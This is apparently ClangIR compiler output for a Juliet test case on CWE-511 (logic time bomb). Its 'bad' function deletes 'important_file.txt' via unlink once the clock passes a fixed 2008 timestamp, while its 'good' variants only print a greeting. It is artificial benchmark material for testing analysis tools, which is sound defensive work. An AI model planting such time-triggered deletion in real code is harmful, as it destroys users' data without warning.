!s32i = !cir.int<s, 32>
!s64i = !cir.int<s, 64>
!s8i = !cir.int<s, 8>
#fn_attr = #cir<extra({nothrow = #cir.nothrow})>
#fn_attr1 = #cir<extra({inline = #cir.inline<no>, nothrow = #cir.nothrow, optnone = #cir.optnone, uwtable = #cir.uwtable<async>})>
module @"/workspaces/juliet-c/testcases/CWE511_Logic_Time_Bomb/CWE511_Logic_Time_Bomb__time_15.c" attributes {cir.lang = #cir.lang<c>, cir.sob = #cir.signed_overflow_behavior<undefined>, cir.triple = "x86_64-unknown-linux-gnu", cir.type_size_info = #cir.type_size_info<char = 8, int = 32, size_t = 64>, cir.uwtable = #cir.uwtable<async>, dlti.dl_spec = #dlti.dl_spec<!llvm.ptr<272> = dense<64> : vector<4xi64>, !llvm.ptr<270> = dense<32> : vector<4xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, !llvm.ptr<271> = dense<32> : vector<4xi64>, f16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, !llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, f80 = dense<128> : vector<2xi64>, i128 = dense<128> : vector<2xi64>, i64 = dense<64> : vector<2xi64>, "dlti.stack_alignment" = 128 : i64, "dlti.endianness" = "little", "dlti.mangling_mode" = "e">} {
  cir.func private @time(!cir.ptr<!s64i>) -> !s64i extra(#fn_attr) loc(#loc82)
  cir.func private @unlink(!cir.ptr<!s8i>) -> !s32i extra(#fn_attr) loc(#loc83)
  cir.global "private" constant cir_private dsolocal @".str" = #cir.const_array<"important_file.txt\00" : !cir.array<!s8i x 19>> : !cir.array<!s8i x 19> {alignment = 1 : i64} loc(#loc5)
  cir.func private @printLine(!cir.ptr<!s8i>) loc(#loc84)
  cir.global "private" constant cir_private dsolocal @".str.1" = #cir.const_array<"Benign, fixed string\00" : !cir.array<!s8i x 21>> : !cir.array<!s8i x 21> {alignment = 1 : i64} loc(#loc8)
  cir.func no_proto @CWE511_Logic_Time_Bomb__time_15_bad() extra(#fn_attr1) {
    cir.scope {
      %0 = cir.const #cir.int<6> : !s32i loc(#loc13)
      cir.switch (%0 : !s32i) {
        cir.case(equal, [#cir.int<6> : !s32i]) {
          cir.scope {
            %1 = cir.alloca !s64i, !cir.ptr<!s64i>, ["currentTime"] {alignment = 8 : i64} loc(#loc88)
            %2 = cir.call @time(%1) : (!cir.ptr<!s64i>) -> !s64i extra(#fn_attr) loc(#loc19)
            cir.scope {
              %3 = cir.load %1 : !cir.ptr<!s64i>, !s64i loc(#loc22)
              %4 = cir.const #cir.int<1199163600> : !s32i loc(#loc23)
              %5 = cir.cast(integral, %4 : !s32i), !s64i loc(#loc23)
              %6 = cir.cmp(gt, %3, %5) : !s64i, !cir.bool loc(#loc90)
              cir.if %6 {
                %7 = cir.get_global @".str" : !cir.ptr<!cir.array<!s8i x 19>> loc(#loc5)
                %8 = cir.cast(array_to_ptrdecay, %7 : !cir.ptr<!cir.array<!s8i x 19>>), !cir.ptr<!s8i> loc(#loc5)
                %9 = cir.call @unlink(%8) : (!cir.ptr<!s8i>) -> !s32i extra(#fn_attr) loc(#loc25)
              } loc(#loc91)
            } loc(#loc89)
          } loc(#loc87)
          cir.break loc(#loc26)
        } loc(#loc14)
        cir.case(default, []) {
          %1 = cir.get_global @".str.1" : !cir.ptr<!cir.array<!s8i x 21>> loc(#loc8)
          %2 = cir.cast(array_to_ptrdecay, %1 : !cir.ptr<!cir.array<!s8i x 21>>), !cir.ptr<!s8i> loc(#loc8)
          cir.call @printLine(%2) : (!cir.ptr<!s8i>) -> () loc(#loc28)
          cir.break loc(#loc29)
        } loc(#loc27)
        cir.yield loc(#loc11)
      } loc(#loc11)
    } loc(#loc86)
    cir.return loc(#loc10)
  } loc(#loc85)
  cir.func no_proto @CWE511_Logic_Time_Bomb__time_15_good() extra(#fn_attr1) {
    %0 = cir.get_global @good1 : !cir.ptr<!cir.func<()>> loc(#loc93)
    cir.call %0() : (!cir.ptr<!cir.func<()>>) -> () loc(#loc32)
    %1 = cir.get_global @good2 : !cir.ptr<!cir.func<()>> loc(#loc94)
    cir.call %1() : (!cir.ptr<!cir.func<()>>) -> () loc(#loc34)
    cir.return loc(#loc31)
  } loc(#loc92)
  cir.global "private" constant cir_private dsolocal @".str.2" = #cir.const_array<"Happy New Year!\00" : !cir.array<!s8i x 16>> : !cir.array<!s8i x 16> {alignment = 1 : i64} loc(#loc36)
  cir.func no_proto internal private @good1() extra(#fn_attr1) {
    cir.scope {
      %0 = cir.const #cir.int<5> : !s32i loc(#loc41)
      cir.switch (%0 : !s32i) {
        cir.case(equal, [#cir.int<6> : !s32i]) {
          %1 = cir.get_global @".str.1" : !cir.ptr<!cir.array<!s8i x 21>> loc(#loc43)
          %2 = cir.cast(array_to_ptrdecay, %1 : !cir.ptr<!cir.array<!s8i x 21>>), !cir.ptr<!s8i> loc(#loc43)
          cir.call @printLine(%2) : (!cir.ptr<!s8i>) -> () loc(#loc44)
          cir.break loc(#loc45)
        } loc(#loc42)
        cir.case(default, []) {
          cir.scope {
            %1 = cir.alloca !s64i, !cir.ptr<!s64i>, ["currentTime"] {alignment = 8 : i64} loc(#loc98)
            %2 = cir.call @time(%1) : (!cir.ptr<!s64i>) -> !s64i extra(#fn_attr) loc(#loc51)
            cir.scope {
              %3 = cir.load %1 : !cir.ptr<!s64i>, !s64i loc(#loc54)
              %4 = cir.const #cir.int<1199163600> : !s32i loc(#loc55)
              %5 = cir.cast(integral, %4 : !s32i), !s64i loc(#loc55)
              %6 = cir.cmp(gt, %3, %5) : !s64i, !cir.bool loc(#loc100)
              cir.if %6 {
                %7 = cir.get_global @".str.2" : !cir.ptr<!cir.array<!s8i x 16>> loc(#loc36)
                %8 = cir.cast(array_to_ptrdecay, %7 : !cir.ptr<!cir.array<!s8i x 16>>), !cir.ptr<!s8i> loc(#loc36)
                cir.call @printLine(%8) : (!cir.ptr<!s8i>) -> () loc(#loc57)
              } loc(#loc101)
            } loc(#loc99)
          } loc(#loc97)
          cir.break loc(#loc58)
        } loc(#loc46)
        cir.yield loc(#loc39)
      } loc(#loc39)
    } loc(#loc96)
    cir.return loc(#loc38)
  } loc(#loc95)
  cir.func no_proto internal private @good2() extra(#fn_attr1) {
    cir.scope {
      %0 = cir.const #cir.int<6> : !s32i loc(#loc63)
      cir.switch (%0 : !s32i) {
        cir.case(equal, [#cir.int<6> : !s32i]) {
          cir.scope {
            %1 = cir.alloca !s64i, !cir.ptr<!s64i>, ["currentTime"] {alignment = 8 : i64} loc(#loc105)
            %2 = cir.call @time(%1) : (!cir.ptr<!s64i>) -> !s64i extra(#fn_attr) loc(#loc69)
            cir.scope {
              %3 = cir.load %1 : !cir.ptr<!s64i>, !s64i loc(#loc72)
              %4 = cir.const #cir.int<1199163600> : !s32i loc(#loc73)
              %5 = cir.cast(integral, %4 : !s32i), !s64i loc(#loc73)
              %6 = cir.cmp(gt, %3, %5) : !s64i, !cir.bool loc(#loc107)
              cir.if %6 {
                %7 = cir.get_global @".str.2" : !cir.ptr<!cir.array<!s8i x 16>> loc(#loc75)
                %8 = cir.cast(array_to_ptrdecay, %7 : !cir.ptr<!cir.array<!s8i x 16>>), !cir.ptr<!s8i> loc(#loc75)
                cir.call @printLine(%8) : (!cir.ptr<!s8i>) -> () loc(#loc76)
              } loc(#loc108)
            } loc(#loc106)
          } loc(#loc104)
          cir.break loc(#loc77)
        } loc(#loc64)
        cir.case(default, []) {
          %1 = cir.get_global @".str.1" : !cir.ptr<!cir.array<!s8i x 21>> loc(#loc79)
          %2 = cir.cast(array_to_ptrdecay, %1 : !cir.ptr<!cir.array<!s8i x 21>>), !cir.ptr<!s8i> loc(#loc79)
          cir.call @printLine(%2) : (!cir.ptr<!s8i>) -> () loc(#loc80)
          cir.break loc(#loc81)
        } loc(#loc78)
        cir.yield loc(#loc61)
      } loc(#loc61)
    } loc(#loc103)
    cir.return loc(#loc60)
  } loc(#loc102)
} loc(#loc)
#loc = loc("/workspaces/juliet-c/testcases/CWE511_Logic_Time_Bomb/CWE511_Logic_Time_Bomb__time_15.c":0:0)
#loc1 = loc("/usr/include/time.h":76:1)
#loc2 = loc("/usr/include/time.h":76:38)
#loc3 = loc("/usr/include/unistd.h":858:1)
#loc4 = loc("/usr/include/unistd.h":858:48)
#loc5 = loc("CWE511_Logic_Time_Bomb__time_15.c":42:20)
#loc6 = loc("../../testcasesupport/std_testcase_io.h":14:1)
#loc7 = loc("../../testcasesupport/std_testcase_io.h":14:33)
#loc8 = loc("CWE511_Logic_Time_Bomb__time_15.c":48:19)
#loc9 = loc("CWE511_Logic_Time_Bomb__time_15.c":31:1)
#loc10 = loc("CWE511_Logic_Time_Bomb__time_15.c":51:1)
#loc11 = loc("CWE511_Logic_Time_Bomb__time_15.c":33:5)
#loc12 = loc("CWE511_Logic_Time_Bomb__time_15.c":50:5)
#loc13 = loc("CWE511_Logic_Time_Bomb__time_15.c":33:12)
#loc14 = loc("CWE511_Logic_Time_Bomb__time_15.c":35:5)
#loc15 = loc("CWE511_Logic_Time_Bomb__time_15.c":36:5)
#loc16 = loc("CWE511_Logic_Time_Bomb__time_15.c":44:5)
#loc17 = loc("CWE511_Logic_Time_Bomb__time_15.c":37:9)
#loc18 = loc("CWE511_Logic_Time_Bomb__time_15.c":37:16)
#loc19 = loc("CWE511_Logic_Time_Bomb__time_15.c":39:9)
#loc20 = loc("CWE511_Logic_Time_Bomb__time_15.c":40:9)
#loc21 = loc("CWE511_Logic_Time_Bomb__time_15.c":43:9)
#loc22 = loc("CWE511_Logic_Time_Bomb__time_15.c":40:13)
#loc23 = loc("CWE511_Logic_Time_Bomb__time_15.c":40:27)
#loc24 = loc("CWE511_Logic_Time_Bomb__time_15.c":41:9)
#loc25 = loc("CWE511_Logic_Time_Bomb__time_15.c":42:13)
#loc26 = loc("CWE511_Logic_Time_Bomb__time_15.c":45:5)
#loc27 = loc("CWE511_Logic_Time_Bomb__time_15.c":46:5)
#loc28 = loc("CWE511_Logic_Time_Bomb__time_15.c":48:9)
#loc29 = loc("CWE511_Logic_Time_Bomb__time_15.c":49:9)
#loc30 = loc("CWE511_Logic_Time_Bomb__time_15.c":103:1)
#loc31 = loc("CWE511_Logic_Time_Bomb__time_15.c":107:1)
#loc32 = loc("CWE511_Logic_Time_Bomb__time_15.c":105:5)
#loc33 = loc("CWE511_Logic_Time_Bomb__time_15.c":105:11)
#loc34 = loc("CWE511_Logic_Time_Bomb__time_15.c":106:5)
#loc35 = loc("CWE511_Logic_Time_Bomb__time_15.c":106:11)
#loc36 = loc("CWE511_Logic_Time_Bomb__time_15.c":73:23)
#loc37 = loc("CWE511_Logic_Time_Bomb__time_15.c":58:1)
#loc38 = loc("CWE511_Logic_Time_Bomb__time_15.c":78:1)
#loc39 = loc("CWE511_Logic_Time_Bomb__time_15.c":60:5)
#loc40 = loc("CWE511_Logic_Time_Bomb__time_15.c":77:5)
#loc41 = loc("CWE511_Logic_Time_Bomb__time_15.c":60:12)
#loc42 = loc("CWE511_Logic_Time_Bomb__time_15.c":62:5)
#loc43 = loc("CWE511_Logic_Time_Bomb__time_15.c":64:19)
#loc44 = loc("CWE511_Logic_Time_Bomb__time_15.c":64:9)
#loc45 = loc("CWE511_Logic_Time_Bomb__time_15.c":65:9)
#loc46 = loc("CWE511_Logic_Time_Bomb__time_15.c":66:5)
#loc47 = loc("CWE511_Logic_Time_Bomb__time_15.c":67:5)
#loc48 = loc("CWE511_Logic_Time_Bomb__time_15.c":75:5)
#loc49 = loc("CWE511_Logic_Time_Bomb__time_15.c":68:9)
#loc50 = loc("CWE511_Logic_Time_Bomb__time_15.c":68:16)
#loc51 = loc("CWE511_Logic_Time_Bomb__time_15.c":70:9)
#loc52 = loc("CWE511_Logic_Time_Bomb__time_15.c":71:9)
#loc53 = loc("CWE511_Logic_Time_Bomb__time_15.c":74:9)
#loc54 = loc("CWE511_Logic_Time_Bomb__time_15.c":71:13)
#loc55 = loc("CWE511_Logic_Time_Bomb__time_15.c":71:27)
#loc56 = loc("CWE511_Logic_Time_Bomb__time_15.c":72:9)
#loc57 = loc("CWE511_Logic_Time_Bomb__time_15.c":73:13)
#loc58 = loc("CWE511_Logic_Time_Bomb__time_15.c":76:5)
#loc59 = loc("CWE511_Logic_Time_Bomb__time_15.c":81:1)
#loc60 = loc("CWE511_Logic_Time_Bomb__time_15.c":101:1)
#loc61 = loc("CWE511_Logic_Time_Bomb__time_15.c":83:5)
#loc62 = loc("CWE511_Logic_Time_Bomb__time_15.c":100:5)
#loc63 = loc("CWE511_Logic_Time_Bomb__time_15.c":83:12)
#loc64 = loc("CWE511_Logic_Time_Bomb__time_15.c":85:5)
#loc65 = loc("CWE511_Logic_Time_Bomb__time_15.c":86:5)
#loc66 = loc("CWE511_Logic_Time_Bomb__time_15.c":94:5)
#loc67 = loc("CWE511_Logic_Time_Bomb__time_15.c":87:9)
#loc68 = loc("CWE511_Logic_Time_Bomb__time_15.c":87:16)
#loc69 = loc("CWE511_Logic_Time_Bomb__time_15.c":89:9)
#loc70 = loc("CWE511_Logic_Time_Bomb__time_15.c":90:9)
#loc71 = loc("CWE511_Logic_Time_Bomb__time_15.c":93:9)
#loc72 = loc("CWE511_Logic_Time_Bomb__time_15.c":90:13)
#loc73 = loc("CWE511_Logic_Time_Bomb__time_15.c":90:27)
#loc74 = loc("CWE511_Logic_Time_Bomb__time_15.c":91:9)
#loc75 = loc("CWE511_Logic_Time_Bomb__time_15.c":92:23)
#loc76 = loc("CWE511_Logic_Time_Bomb__time_15.c":92:13)
#loc77 = loc("CWE511_Logic_Time_Bomb__time_15.c":95:5)
#loc78 = loc("CWE511_Logic_Time_Bomb__time_15.c":96:5)
#loc79 = loc("CWE511_Logic_Time_Bomb__time_15.c":98:19)
#loc80 = loc("CWE511_Logic_Time_Bomb__time_15.c":98:9)
#loc81 = loc("CWE511_Logic_Time_Bomb__time_15.c":99:9)
#loc82 = loc(fused[#loc1, #loc2])
#loc83 = loc(fused[#loc3, #loc4])
#loc84 = loc(fused[#loc6, #loc7])
#loc85 = loc(fused[#loc9, #loc10])
#loc86 = loc(fused[#loc11, #loc12])
#loc87 = loc(fused[#loc15, #loc16])
#loc88 = loc(fused[#loc17, #loc18])
#loc89 = loc(fused[#loc20, #loc21])
#loc90 = loc(fused[#loc22, #loc23])
#loc91 = loc(fused[#loc24, #loc21])
#loc92 = loc(fused[#loc30, #loc31])
#loc93 = loc(fused[#loc32, #loc33])
#loc94 = loc(fused[#loc34, #loc35])
#loc95 = loc(fused[#loc37, #loc38])
#loc96 = loc(fused[#loc39, #loc40])
#loc97 = loc(fused[#loc47, #loc48])
#loc98 = loc(fused[#loc49, #loc50])
#loc99 = loc(fused[#loc52, #loc53])
#loc100 = loc(fused[#loc54, #loc55])
#loc101 = loc(fused[#loc56, #loc53])
#loc102 = loc(fused[#loc59, #loc60])
#loc103 = loc(fused[#loc61, #loc62])
#loc104 = loc(fused[#loc65, #loc66])
#loc105 = loc(fused[#loc67, #loc68])
#loc106 = loc(fused[#loc70, #loc71])
#loc107 = loc(fused[#loc72, #loc73])
#loc108 = loc(fused[#loc74, #loc71])
